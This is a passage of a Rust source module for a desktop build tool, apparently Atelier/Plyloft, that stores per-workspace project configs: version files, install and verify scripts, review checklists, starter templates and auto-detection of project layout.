//! Per-workspace project configuration — Cycle C foundation.
//!
//! Each workspace can have a `ProjectConfig` describing how Atelier
//! should ship and verify it: which branch to land on, which file(s)
//! carry the version, which script does the install, which script
//! verifies. Without per-project config, the ship pipeline is
//! Atelier-hardcoded (`main` / `package.json` + `Cargo.toml` +
//! `tauri.conf.json` / `scripts/install-local.sh` /
//! `scripts/ppvp.sh`), which blocks LYRA and every other project
//! from using the same flows.
//!
//! Storage: `<config_dir>/projects/<workspace_id>/config.json`.
//! Atomic writes via tempfile + rename (Hard Rule #3). The
//! workspace_id-keyed subdirectory also hosts the workspace's other
//! per-project files (the shared-definition cache and queues; a
//! pre-1.146 `intake.md` is left there but ignored since GH #214);
//! that's why each workspace gets its own dir rather than a flat
//! `<workspace_id>.json`.
//!
//! Bootstrap: at app launch, any workspace whose cwd has Atelier's
//! structural markers (`package.json` + `src-tauri/` +
//! `scripts/install-local.sh`) gets `default_atelier_config()`
//! written if no config exists yet. This is what lets v1.12.0 ship
//! without breaking Atelier's own ship pipeline (which still uses
//! the hardcoded values today; v1.12.2 wires it to read from here).
//!
//! v1.12.0: introduced.

use parking_lot::Mutex;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

const PROJECTS_SUBDIR: &str = "projects";

/// What a card start or a Ship tells a workspace with no config to do: the
/// page and the button that write one. `src/lib/projectSetup.ts` finds a
/// refusal by this phrase to offer the button that opens the page (its test
/// reads the phrase from here).
pub const SET_UP_TODO: &str =
    "Open Settings › Cards › Building and checking and press Re-detect";

/// 1.174.0 (DS9): the same words before Settings was grouped by task —
/// refusals already on cards carry them, and `projectSetup.ts` still finds
/// them.
pub const SET_UP_TODO_1173: &str =
    "Open Settings › This repository › Build and release and press Re-detect";

/// Onboarding §9.1: the words a [`not_set_up`] refusal gains while Setup
/// isn't finished — the other way to a project config is Setup's own
/// project steps.
pub const OR_FINISH_SETUP: &str = ", or finish setup";

/// The refusal of a card start or a Ship in a workspace with no config, by
/// the workspace's name — never its id. `stopped` says what did not happen,
/// `then` how to retry. In a shared repository this account can't write,
/// Re-detect is not a button (its result would have to be published), so the
/// refusal says who can set it up instead, and carries no [`SET_UP_TODO`].
///
/// OB-15 (onboarding §9.1): while Setup isn't finished — `setup_unfinished`,
/// from [`setup_unfinished`] — the writable refusal also says *or finish
/// setup* ([`OR_FINISH_SETUP`]). The read-only one doesn't: finishing Setup
/// can't write a repository this account can't write.
pub fn not_set_up(
    workspace_name: &str,
    read_only: bool,
    setup_unfinished: bool,
    stopped: &str,
    then: &str,
) -> String {
    if read_only {
        return format!(
            "{workspace_name} isn't set up for Plyloft's builds yet, so Plyloft doesn't know which \
             branch to work from. {stopped} Its settings are shared and this account can't \
             write to the repository: someone with write access has to press Re-detect in \
             Settings › Cards › Building and checking and publish; then {then}."
        );
    }
    let or_finish = if setup_unfinished { OR_FINISH_SETUP } else { "" };
    format!(
        "{workspace_name} isn't set up for Plyloft's builds yet, so Plyloft doesn't know which \
         branch to work from. {stopped} {SET_UP_TODO}{or_finish}, then {then}."
    )
}

/// OB-15 (onboarding §4, §9.1): Setup's `project` item is missing — no
/// workspace on this Mac has a project config. That is when the sidebar's
/// "Setup isn't finished · Finish" row shows for a refusal about a config
/// (the row draws for every missing item; the refusal names only the one it
/// is about), and when finishing Setup would write one. Only configs of
/// workspaces that still exist count: a removed workspace's config left on
/// disk is not a project (the frontend counts the same way).
pub fn setup_unfinished(
    store: &ProjectConfigStore,
    workspaces: &crate::workspace::WorkspaceStore,
) -> bool {
    let ids: std::collections::HashSet<String> = workspaces
        .snapshot()
        .workspaces
        .into_iter()
        .map(|w| w.id)
        .collect();
    !store.list().iter().any(|(id, _)| ids.contains(id))
}

/// A card start's refusal in a workspace with no config (`None` when it has
/// one): the card start refuses with it, and — v1.154.1 (K1) — the one-time
/// `.env` question is not asked before it (`worktree_env_proposal` answers
/// with it first), so nobody answers a question and is then refused.
pub fn card_start_refusal(
    store: &ProjectConfigStore,
    workspaces: &crate::workspace::WorkspaceStore,
    workspace_id: &str,
) -> Option<String> {
    if store.get(workspace_id).is_some() {
        return None;
    }
    let name = workspaces
        .snapshot()
        .workspaces
        .into_iter()
        .find(|w| w.id == workspace_id)
        .map(|w| w.name)
        .filter(|name| !name.trim().is_empty())
        .unwrap_or_else(|| "This workspace".to_string());
    Some(not_set_up(
        &name,
        shared_read_only(store, workspace_id),
        setup_unfinished(store, workspaces),
        "Nothing was started.",
        "start the card again",
    ))
}

/// Whether `workspace_id`'s shared settings are read-only to this account
/// (GH #82), for [`not_set_up`].
pub fn shared_read_only(store: &ProjectConfigStore, workspace_id: &str) -> bool {
    crate::workspace_definition::load_cache(store, workspace_id)
        .is_some_and(|cache| cache.write_access.read_only())
}

const CONFIG_FILENAME: &str = "config.json";
/// ADR 0006 (third card): review settings of a workspace without a config.
const REVIEW_FILENAME: &str = "review.json";
/// Try it: the start command kept on this Mac while the repository has no
/// `config.json` here yet (the `review.json` precedent); the first config
/// written from this Mac takes it over and the file goes.
const TRY_FILENAME: &str = "try_command.json";
/// v2 (v1.13.5): replaces `verify_script: Option<String>` with
/// `verify_pipeline: Option<Vec<VerifyKind>>` so projects can express
/// either shell-script verifies (Atelier) or Claude-Code slash-command
/// verifies (LYRA's `/ppvp`). Migration runs on load and discards the
/// old `verify_script` field after translating to a 1-element pipeline.
pub const PROJECT_CONFIG_SCHEMA_VERSION: u32 = 2;

/// One file in `version_files`. Atelier-style projects with three
/// concurrent version sources (`package.json` + `Cargo.toml` +
/// `tauri.conf.json`) use a 3-element vec; simpler projects use 1.
/// All entries are written on a version bump and asserted to agree.
///
/// v1.13.0 (Cycle D finding A): adds optional `variable_name` for the
/// `PythonModuleVar` kind so source-level Python version strings
/// (e.g., LYRA's `FastAPI(version="1.0.0")`) can be expressed.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct VersionFileEntry {
    /// Path relative to the workspace cwd.
    pub path: String,
    pub kind: VersionFileKind,
    /// v1.13.0: required when `kind == PythonModuleVar`; ignored for
    /// other kinds. Names the variable / keyword to find. Most
    /// commonly `"version"` — captures both top-level assignments
    /// (`VERSION = "..."`) and keyword arguments in function calls
    /// (FastAPI's `version = "..."`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub variable_name: Option<String>,
}

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum VersionFileKind {
    /// JSON file with a top-level `version` string field.
    PackageJson,
    /// TOML file with `[package] version = "..."`.
    CargoToml,
    /// JSON file with a top-level `version` string field
    /// (Tauri's config — same shape as `package.json`).
    TauriConfJson,
    /// v1.13.0: PEP 621 pyproject.toml — `[project] version = "..."`.
    /// Same line-replace approach as `CargoToml` but scoped to
    /// `[project]` instead of `[package]`.
    PyProjectToml,
    /// v1.13.0: Python source-code string variable. Found via simple
    /// scanner that locates `<variable_name>\s*=\s*"..."` with
    /// word-boundary checks. Matches both top-level assignments
    /// (`VERSION = "..."`) and keyword arguments in function calls
    /// (`FastAPI(version="...")`). Requires `variable_name` on the
    /// entry. Cycle D finding A — needed to express LYRA's pattern.
    PythonModuleVar,
}

/// One step in the verify pipeline. Atelier today runs a single
/// shell script that internally cascades cargo-test + ppvp-sh +
/// tauri-build; LYRA's verify is a single Claude-Code slash command
/// (`/ppvp`). The Vec at `ProjectConfig::verify_pipeline` lets a
/// project express either shape: a 1-element Vec for "one step",
/// or N-element for sequential fail-fast composition.
///
/// `args` defaults to an empty Vec — supports `/ppvp --staging`-style
/// invocations without a future re-bump.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(tag = "kind", rename_all = "snake_case")]
pub enum VerifyKind {
    /// Shell script invocation (e.g. `scripts/ppvp.sh`). Workspace-
    /// relative path. The exit code determines pass/fail.
    Script {
        path: String,
    },
    /// Claude-Code slash command (e.g. `/ppvp`). Runtime invocation
    /// implemented in v1.15.0 (Cycle E1) — see `verify::run_claude_slash_step`.
    /// Runs `/<name> <args>` as the prompt of Claude's interactive TUI in a
    /// PTY (Hard Rule #1; never `claude -p`), collected through the
    /// session's transcript, and determines pass/fail from Plyloft's result
    /// line; a session that ends without one fails.
    SlashCommand {
        name: String,
        #[serde(default)]
        args: Vec<String>,
    },
}

/// Per-workspace project config. Future-proofed via `schema_version`;
/// v1 → v2 migrations follow the kanban-store pattern (no-op
/// `serde(default)` for additive fields, explicit migration arms for
/// breaking changes).
///
/// v1.13.5: replaced `verify_script: Option<String>` with
/// `verify_pipeline: Option<Vec<VerifyKind>>`. The legacy `verify_script`
/// field is captured on deserialization (skip-serialize so it never
/// rewrites) and translated to a 1-element pipeline by `get()`.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct ProjectConfig {
    pub schema_version: u32,
    /// Branch the ship pipeline lands on (e.g. "main", "staging").
    pub target_branch: String,
    /// All files that carry the version. Order is significant —
    /// the first entry is canonical for read-back. All are written
    /// in lockstep on a version bump.
    pub version_files: Vec<VersionFileEntry>,
    /// Script invoked after commit + tag to actually install the new
    /// binary. Workspace-relative. None means "no install step";
    /// commit + tag are the entire ship.
    #[serde(default)]
    pub install_script: Option<String>,
    /// Try it (TRY_IT_SPEC §5.1): the command that starts the app, as the
    /// person would type it in a terminal (`npm run dev`). Shared through the
    /// definition as `tryCommand`; each machine allows it once
    /// (`worktree_setup::WorktreeSettings::approved_try`). Additive: absent =
    /// none, left out of the file while unset so an older config re-saves as
    /// it was, and a value of the wrong type reads as unset.
    #[serde(
        default,
        skip_serializing_if = "Option::is_none",
        deserialize_with = "lenient_opt"
    )]
    pub try_command: Option<String>,
    /// v1.13.5 (Cycle D finding G): how the verify pipeline runs.
    /// None means "skip verify is implicit for this project". A
    /// non-empty Vec runs entries sequentially fail-fast.
    #[serde(default)]
    pub verify_pipeline: Option<Vec<VerifyKind>>,
    /// v1.13.5 deprecated. Captured from v1 disk JSON for migration;
    /// always serialized as None (skip_serializing_if). After
    /// `get()` runs, the migrated config has this set to None and
    /// `verify_pipeline` carries the equivalent 1-element Vec.
    /// Construct new configs without this field — set
    /// `verify_pipeline` directly.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub verify_script: Option<String>,
    /// Build-cache directories, relative to a card checkout, stripped
    /// before a pruned worktree goes to the trash (and from trash entries),
    /// on top of `worktrees::DEFAULT_CACHE_PATHS`. Only git-ignored,
    /// untracked directories are ever removed. Additive: absent = empty.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub cache_paths: Vec<String>,
    /// Verify runs in card worktrees share one Cargo target
    /// (`CARGO_TARGET_DIR=<workspace>/.plyloft-worktrees/.cargo-target`),
    /// after cleaning the workspace's own packages out of it
    /// (`build_cache::reset_shared_target`). Builder sessions always keep
    /// their worktree's `target/`. Off keeps Verify on it too. Additive:
    /// absent = on.
    #[serde(default = "default_true")]
    pub shared_build_cache: bool,
    /// ADR 0006 (third card): Build done first asks the Builder to go over
    /// its change against the risk checklist. Additive: absent = on.
    #[serde(default = "default_true")]
    pub self_check: bool,
    /// ADR 0006 (third card): this repository's own risk classes, quoted
    /// after the core (A to I) as J, K… in the sweep, the follow-up and the
    /// self-check. Additive: absent = none. See [`validate_review_checklist`].
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub review_checklist: Vec<ReviewChecklistClass>,
    /// Findings filter: `Findings that block approval`. Additive: absent =
    /// `P1 and P2`, the rule before the setting; left out of the file while
    /// it is the default, so an older config re-saves as it was. This Mac's
    /// own: it does not travel in the shared definition.
    #[serde(default, skip_serializing_if = "is_default_threshold")]
    pub blocking_findings: BlockingThreshold,
    pub created_at: i64,
    pub updated_at: i64,
}

fn default_true() -> bool {
    true
}

/// An optional field whose value has the wrong type (a hand edit, a later
/// Plyloft) reads as unset instead of failing the whole file's parse.
pub(crate) fn lenient_opt<'de, D, T>(deserializer: D) -> Result<Option<T>, D::Error>
where
    D: serde::Deserializer<'de>,
    T: serde::de::DeserializeOwned,
{
    let value = serde_json::Value::deserialize(deserializer)?;
    Ok(serde_json::from_value(value).ok())
}

pub use crate::review_ledger::BlockingThreshold;

fn is_default_threshold(threshold: &BlockingThreshold) -> bool {
    *threshold == BlockingThreshold::default()
}

/// One class a repository adds to the risk checklist: a name and one
/// sentence saying what to look for.
#[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct ReviewChecklistClass {
    pub name: String,
    #[serde(default)]
    pub sentence: String,
}

/// ADR 0006 (third card): a workspace's review settings — `Self-check
/// before review` and its own checklist classes. They live in the project
/// config (and so in the shared definition); a workspace not set up for
/// Build & release yet keeps them in `review.json` beside where the config
/// will be, and the first config written takes them over.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ReviewSettings {
    #[serde(default = "default_true")]
    pub self_check: bool,
    #[serde(default)]
    pub review_checklist: Vec<ReviewChecklistClass>,
    /// Findings filter: which findings block approval; absent = `P1 and P2`.
    #[serde(default)]
    pub blocking_findings: BlockingThreshold,
}

impl Default for ReviewSettings {
    fn default() -> Self {
        Self { self_check: true, review_checklist: Vec::new(), blocking_findings: BlockingThreshold::default() }
    }
}

/// ADR 0006 (third card): change a workspace's review settings — the switch
/// and/or the classes — leaving every other field as the store holds it.
/// `base` is the list the editor started from: a list that changed since
/// (a Sync, another window) refuses the save instead of being overwritten.
/// The classes must be valid, or at least less invalid than what is stored
/// (a hand-edited list over the limits is repaired one step at a time).
pub fn set_review(
    store: &ProjectConfigStore,
    workspace_id: &str,
    self_check: Option<bool>,
    review_checklist: Option<Vec<ReviewChecklistClass>>,
    base: Option<Vec<ReviewChecklistClass>>,
) -> Result<ReviewSettings, String> {
    let mut review = store.review(workspace_id);
    if let Some(base) = base {
        if base != review.review_checklist {
            return Err("The checklist changed meanwhile (a Sync, or another window); Settings now shows the current list — make your change again.".into());
        }
    }
    if let Some(on) = self_check {
        review.self_check = on;
    }
    if let Some(classes) = review_checklist {
        review.review_checklist = match validate_review_checklist(&classes) {
            Ok(valid) => valid,
            Err(e) if checklist_invalidity(&classes) < checklist_invalidity(&review.review_checklist) => {
                log::info!("project_config: {workspace_id} checklist repaired a step, still invalid: {e}");
                classes
            }
            Err(e) => return Err(e),
        };
    }
    store.set_review_settings(workspace_id, &review)?;
    Ok(store.review(workspace_id))
}

/// Findings filter: change a workspace's `Findings that block approval`,
/// leaving every other review setting as the store holds it. It applies
/// from the next review that settles.
pub fn set_blocking_findings(
    store: &ProjectConfigStore,
    workspace_id: &str,
    threshold: BlockingThreshold,
) -> Result<ReviewSettings, String> {
    let mut review = store.review(workspace_id);
    review.blocking_findings = threshold;
    store.set_review_settings(workspace_id, &review)?;
    Ok(store.review(workspace_id))
}

/// How far a list is from the limits: classes over the count, plus classes
/// without a name or a sentence, or over the length. 0 is valid.
pub fn checklist_invalidity(classes: &[ReviewChecklistClass]) -> usize {
    let bad = classes
        .iter()
        .filter(|class| {
            let name = class.name.split_whitespace().count() == 0;
            let sentence = class.sentence.split_whitespace().count() == 0;
            let chars = class.name.split_whitespace().collect::<Vec<_>>().join(" ").chars().count()
                + class.sentence.split_whitespace().collect::<Vec<_>>().join(" ").chars().count();
            name || sentence || chars > REVIEW_CHECKLIST_CLASS_MAX_CHARS
        })
        .count();
    classes.len().saturating_sub(REVIEW_CHECKLIST_MAX_CLASSES) + bad
}

/// A repository adds at most this many classes (J to U).
pub const REVIEW_CHECKLIST_MAX_CLASSES: usize = 12;
/// A class, name and sentence together, in characters.
pub const REVIEW_CHECKLIST_CLASS_MAX_CHARS: usize = 300;

/// The classes trimmed, or the message the editor shows. Every class needs
/// a name; the limits are the ones above.
pub fn validate_review_checklist(
    classes: &[ReviewChecklistClass],
) -> Result<Vec<ReviewChecklistClass>, String> {
    if classes.len() > REVIEW_CHECKLIST_MAX_CLASSES {
        return Err(format!(
            "A repository can add at most {REVIEW_CHECKLIST_MAX_CLASSES} checklist classes; this list has {}.",
            classes.len()
        ));
    }
    let mut out = Vec::with_capacity(classes.len());
    for (index, class) in classes.iter().enumerate() {
        let name = class.name.split_whitespace().collect::<Vec<_>>().join(" ");
        let sentence = class.sentence.split_whitespace().collect::<Vec<_>>().join(" ");
        let letter = crate::review_passes::class_letter(index);
        if name.is_empty() {
            return Err(format!("Checklist class {letter} needs a name."));
        }
        if sentence.is_empty() {
            return Err(format!(
                "Checklist class {letter} ({name}) needs its sentence: what a review must look for."
            ));
        }
        let chars = name.chars().count() + sentence.chars().count();
        if chars > REVIEW_CHECKLIST_CLASS_MAX_CHARS {
            return Err(format!(
                "Checklist class {letter} ({name}) is {chars} characters; a class is at most {REVIEW_CHECKLIST_CLASS_MAX_CHARS}, name and sentence together."
            ));
        }
        out.push(ReviewChecklistClass { name, sentence });
    }
    Ok(out)
}

fn now_millis() -> i64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_millis() as i64)
        .unwrap_or(0)
}

/// v1.18.0 (Cycle E3): a builtin starter-pack template. Stamps a
/// reasonable default ProjectConfig for a common project shape, so
/// onboarding a new (non-Atelier) workspace doesn't require hand-
/// writing the JSON. Templates are surfaced in `ProjectConfigPanel`'s
/// not-onboarded state alongside the Detect button.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct ProjectConfigTemplate {
    /// Stable identifier (e.g. "rust-crate"). Used by the FE as the
    /// `apply_template` argument. Don't rename existing ids — that's
    /// the only durable contract templates have with stored configs.
    pub id: String,
    /// Display name shown in the picker.
    pub label: String,
    /// 1–2 sentence description; surfaced under the `<select>` in the
    /// FE so users can pick without diving into the config.
    pub description: String,
    /// Canonical ProjectConfig for this template. `created_at` /
    /// `updated_at` are placeholders (set to 0); `apply_template`
    /// rewrites them to `now_millis()` before persisting.
    pub config: ProjectConfig,
}

/// v1.18.0 (Cycle E3): the 5 starter-pack templates shipped this cycle.
/// Stable order — ids are user-facing once any workspace stamps from
/// one. Adding a new template is additive; renaming an id breaks the
/// FE's apply-template form on persisted clients with no migration.
///
/// Each template's `verify_pipeline` defaults to a `Script` entry
/// pointing at a conventional script path the user is expected to
/// materialize themselves (e.g. `scripts/test.sh`). The description
/// notes this; users can edit the saved config to swap in a
/// `SlashCommand` (slash-command verify shipped in v1.15.0) or a
/// different script path.
pub fn builtin_templates() -> Vec<ProjectConfigTemplate> {
    vec![
        rust_crate_template(),
        tauri_app_template(),
        python_package_template(),
        node_monorepo_template(),
        astro_vite_template(),
    ]
}

pub(crate) fn template_config_skeleton(
    target_branch: &str,
    version_files: Vec<VersionFileEntry>,
    install_script: Option<&str>,
    verify_pipeline: Option<Vec<VerifyKind>>,
) -> ProjectConfig {
    ProjectConfig {
        schema_version: PROJECT_CONFIG_SCHEMA_VERSION,
        target_branch: target_branch.to_string(),
        version_files,
        install_script: install_script.map(|s| s.to_string()),
        try_command: None,
        verify_pipeline,
        verify_script: None,
        cache_paths: Vec::new(),
        shared_build_cache: true,
        self_check: true,
        review_checklist: Vec::new(),
        blocking_findings: Default::default(),
        created_at: 0,
        updated_at: 0,
    }
}

fn rust_crate_template() -> ProjectConfigTemplate {
    ProjectConfigTemplate {
        id: "rust-crate".to_string(),
        label: "Rust crate".to_string(),
        description:
            "Cargo workspace with a single Cargo.toml at the root. Verify defaults to scripts/test.sh — replace with `cargo test` or your own runner."
                .to_string(),
        config: template_config_skeleton(
            "main",
            vec![VersionFileEntry {
                path: "Cargo.toml".to_string(),
                kind: VersionFileKind::CargoToml,
                variable_name: None,
            }],
            None,
            Some(vec![VerifyKind::Script {
                path: "scripts/test.sh".to_string(),
            }]),
        ),
    }
}

fn tauri_app_template() -> ProjectConfigTemplate {
    ProjectConfigTemplate {
        id: "tauri-app".to_string(),
        label: "Tauri app".to_string(),
        description:
            "Tauri 2 desktop app (Rust + frontend). Tracks package.json, src-tauri/Cargo.toml, src-tauri/tauri.conf.json. Mirrors the Atelier baseline."
                .to_string(),
        config: template_config_skeleton(
            "main",
            vec![
                VersionFileEntry {
                    path: "package.json".to_string(),
                    kind: VersionFileKind::PackageJson,
                    variable_name: None,
                },
                VersionFileEntry {
                    path: "src-tauri/Cargo.toml".to_string(),
                    kind: VersionFileKind::CargoToml,
                    variable_name: None,
                },
                VersionFileEntry {
                    path: "src-tauri/tauri.conf.json".to_string(),
                    kind: VersionFileKind::TauriConfJson,
                    variable_name: None,
                },
            ],
            Some("scripts/install-local.sh"),
            Some(vec![VerifyKind::Script {
                path: "scripts/ppvp.sh".to_string(),
            }]),
        ),
    }
}

fn python_package_template() -> ProjectConfigTemplate {
    ProjectConfigTemplate {
        id: "python-package".to_string(),
        label: "Python package".to_string(),
        description:
            "Python package with pyproject.toml at the root. Install defaults to `pip install -e .`; verify defaults to scripts/test.sh — replace with `pytest` or your runner."
                .to_string(),
        config: template_config_skeleton(
            "main",
            vec![VersionFileEntry {
                path: "pyproject.toml".to_string(),
                kind: VersionFileKind::PyProjectToml,
                variable_name: None,
            }],
            Some("pip install -e ."),
            Some(vec![VerifyKind::Script {
                path: "scripts/test.sh".to_string(),
            }]),
        ),
    }
}

fn node_monorepo_template() -> ProjectConfigTemplate {
    ProjectConfigTemplate {
        id: "node-monorepo".to_string(),
        label: "Node monorepo".to_string(),
        description:
            "npm or pnpm workspace with the root package.json carrying the canonical version. Add per-package version_files via Detect or by editing the saved config."
                .to_string(),
        config: template_config_skeleton(
            "main",
            vec![VersionFileEntry {
                path: "package.json".to_string(),
                kind: VersionFileKind::PackageJson,
                variable_name: None,
            }],
            Some("npm install"),
            Some(vec![VerifyKind::Script {
                path: "scripts/test.sh".to_string(),
            }]),
        ),
    }
}

fn astro_vite_template() -> ProjectConfigTemplate {
    ProjectConfigTemplate {
        id: "astro-vite".to_string(),
        label: "Astro / Vite site".to_string(),
        description:
            "Static site or SPA with package.json at the root. Verify defaults to scripts/test.sh — replace with `npm run build` if you'd rather gate on the build."
                .to_string(),
        config: template_config_skeleton(
            "main",
            vec![VersionFileEntry {
                path: "package.json".to_string(),
                kind: VersionFileKind::PackageJson,
                variable_name: None,
            }],
            Some("npm install"),
            Some(vec![VerifyKind::Script {
                path: "scripts/test.sh".to_string(),
            }]),
        ),
    }
}

/// Atelier's hardcoded baseline. Used by the launch-time bootstrap to
/// write a config that exactly mirrors today's ship-pipeline behavior,
/// so v1.12.0 ships with zero functional change for the Atelier
/// workspace itself. v1.12.2 wires `ship.rs` to read this config
/// instead of its hardcoded values; the existing pipeline keeps
/// working unchanged because the config matches the hardcoded values
/// 1:1.
pub fn default_atelier_config() -> ProjectConfig {
    let now = now_millis();
    ProjectConfig {
        schema_version: PROJECT_CONFIG_SCHEMA_VERSION,
        target_branch: "main".to_string(),
        version_files: vec![
            VersionFileEntry {
                path: "package.json".to_string(),
                kind: VersionFileKind::PackageJson,
                variable_name: None,
            },
            VersionFileEntry {
                path: "src-tauri/Cargo.toml".to_string(),
                kind: VersionFileKind::CargoToml,
                variable_name: None,
            },
            VersionFileEntry {
                path: "src-tauri/tauri.conf.json".to_string(),
                kind: VersionFileKind::TauriConfJson,
                variable_name: None,
            },
        ],
        install_script: Some("scripts/install-local.sh".to_string()),
        try_command: None,
        verify_pipeline: Some(vec![VerifyKind::Script {
            path: "scripts/ppvp.sh".to_string(),
        }]),
        verify_script: None,
        cache_paths: Vec::new(),
        shared_build_cache: true,
        self_check: true,
        review_checklist: Vec::new(),
        blocking_findings: Default::default(),
        created_at: now,
        updated_at: now,
    }
}

/// True if `cwd` has the structural markers of the Atelier
/// repository. Mirrors the heuristic in `ship::resolve_atelier_repo_root`
/// — kept in sync because changing one without the other would let the
/// bootstrap diverge from what the ship-gate audit considers "the
/// Atelier repo".
pub fn looks_like_atelier(cwd: &Path) -> bool {
    cwd.join("package.json").exists()
        && cwd.join("src-tauri").is_dir()
        && cwd.join("scripts/install-local.sh").exists()
}

/// v1.12.1 (Cycle C): purely-deterministic filesystem scan to propose
/// a `ProjectConfig` for a workspace. Used by the setup flow when a
/// new workspace is added (and on the FE "Re-detect" button). Returns
/// what it can infer; missing pieces stay None for the user to fill
/// in via the workspace settings panel.
///
/// Scanned signals:
/// - **target_branch**: `git rev-parse --abbrev-ref HEAD` if the dir
///   is a git repo; falls back to `main` otherwise.
/// - **version_files**: every recognized file present at standard
///   locations (root + `src-tauri/`). Atelier-shaped repos pick up
///   all three; pure-Node picks up `package.json` only; pure-Rust
///   picks up `Cargo.toml`. Order: root files first, then
///   `src-tauri/` (so the Atelier ordering is preserved).
/// - **install_script**: `scripts/install-local.sh` → `scripts/install.sh`
///   → `install.sh` → None.
/// - **verify_script**: `scripts/ppvp.sh` → `scripts/verify.sh` →
///   `scripts/test.sh` → None.
///
/// Future enrichment (v1.12.6+): spawn a one-shot Claude that reads
/// CLAUDE.md and refines the proposal. Today's deterministic scan is
/// enough to onboard most projects; CLAUDE.md presence is reported
/// in the proposal so the FE can hint the user toward an
/// agent-assisted refinement.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct ProjectConfigProposal {
    pub config: ProjectConfig,
    /// True if the project has a `CLAUDE.md` at its root. The FE uses
    /// this to surface a "this project has agent docs" hint and offer
    /// the future agent-assisted refinement path.
    pub has_claude_md: bool,
    /// Free-form notes from the scan — used by the FE to explain
    /// what was inferred ("detected Rust + Tauri + Node project; 3
    /// version sources").
    pub notes: Vec<String>,
}

fn detect_target_branch(cwd: &Path) -> String {
    let output = crate::platform::git_command()
        .args(["rev-parse", "--abbrev-ref", "HEAD"])
        .current_dir(cwd)
        .output();
    match output {
        Ok(o) if o.status.success() => {
            let branch = String::from_utf8_lossy(&o.stdout).trim().to_string();
            if branch.is_empty() || branch == "HEAD" {
                "main".to_string()
            } else {
                branch
            }
        }
        _ => "main".to_string(),
    }
}

/// Subdirectories the depth-1 monorepo scan should skip. Same shape
/// as `watcher::NOISY_NAMES` — keep manually in sync; pulling the
/// full constant in just for this would create a heavier coupling
/// for a list that hasn't changed since v0.5.
const NOISY_SUBDIR_NAMES: &[&str] = &[
    "node_modules",
    "target",
    "dist",
    "build",
    "out",
    "__pycache__",
    ".venv",
    "venv",
    ".next",
    ".cache",
    ".plyloft-worktrees",
    ".atelier-worktrees",
];

fn detect_version_files(cwd: &Path) -> Vec<VersionFileEntry> {
    let mut found = Vec::new();

    // Direct paths — root + Atelier-shape `src-tauri/` (canonical order).
    let direct_candidates: &[(&str, VersionFileKind)] = &[
        ("package.json", VersionFileKind::PackageJson),
        ("Cargo.toml", VersionFileKind::CargoToml),
        ("tauri.conf.json", VersionFileKind::TauriConfJson),
        ("pyproject.toml", VersionFileKind::PyProjectToml),
        ("src-tauri/Cargo.toml", VersionFileKind::CargoToml),
        ("src-tauri/tauri.conf.json", VersionFileKind::TauriConfJson),
    ];
    for (path, kind) in direct_candidates {
        if cwd.join(path).exists() {
            found.push(VersionFileEntry {
                path: (*path).to_string(),
                kind: *kind,
                variable_name: None,
            });
        }
    }

    // v1.13.0 (Cycle D finding B): depth-1 monorepo scan. For
    // every direct sub-directory that isn't dotfile/noisy, look
    // for known version files and surface them as candidates.
    // The user curates via the FE proposal-card edit (v1.13.0
    // adds per-row remove). Skips `src-tauri/` because it's
    // already covered by the direct list above.
    let depth1_filenames: &[(&str, VersionFileKind)] = &[
        ("package.json", VersionFileKind::PackageJson),
        ("Cargo.toml", VersionFileKind::CargoToml),
        ("pyproject.toml", VersionFileKind::PyProjectToml),
    ];
    if let Ok(entries) = fs::read_dir(cwd) {
        let mut subdirs: Vec<String> = Vec::new();
        for entry in entries.filter_map(|r| r.ok()) {
            let path = entry.path();
            if !path.is_dir() {
                continue;
            }
            let name = match entry.file_name().into_string() {
                Ok(s) => s,
                Err(_) => continue,
            };
            if name.starts_with('.') || NOISY_SUBDIR_NAMES.contains(&name.as_str()) {
                continue;
            }
            if name == "src-tauri" {
                continue; // Already covered.
            }
            subdirs.push(name);
        }
        subdirs.sort();
        for name in subdirs {
            for (file_name, kind) in depth1_filenames {
                let sub_path = cwd.join(&name).join(file_name);
                if sub_path.is_file() {
                    let rel = format!("{name}/{file_name}");
                    found.push(VersionFileEntry {
                        path: rel,
                        kind: *kind,
                        variable_name: None,
                    });
                }
            }
        }
    }

    // v1.13.0 (Cycle D finding A): Python module-var detection.
    // Atelier's deterministic scan can't know every Python project's
    // versioning convention, but a conservative heuristic catches
    // FastAPI-shape projects (LYRA's pattern): scan `main.py` at
    // root and any `*.py` in `config/` for a literal
    // `version = "..."` (or `version="..."`). When found, add as a
    // PythonModuleVar entry with `variable_name: "version"` — the
    // user can keep, remove, or edit.
    let python_var_targets: Vec<PathBuf> = {
        let mut out: Vec<PathBuf> = Vec::new();
        let main_py = cwd.join("main.py");
        if main_py.is_file() {
            out.push(main_py);
        }
        let config_dir = cwd.join("config");
        if config_dir.is_dir() {
            if let Ok(entries) = fs::read_dir(&config_dir) {
                let mut config_files: Vec<PathBuf> = Vec::new();
                for entry in entries.filter_map(|r| r.ok()) {
                    let p = entry.path();
                    if p.is_file()
                        && p.extension().and_then(|s| s.to_str()) == Some("py")
                    {
                        config_files.push(p);
                    }
                }
                config_files.sort();
                out.extend(config_files);
            }
        }
        out
    };
    for path in python_var_targets {
        if let Ok(body) = fs::read_to_string(&path) {
            if find_var_in_text(&body, "version").is_some() {
                let rel = path
                    .strip_prefix(cwd)
                    .map(crate::platform::slash_path)
                    .unwrap_or_else(|_| path.to_string_lossy().into_owned());
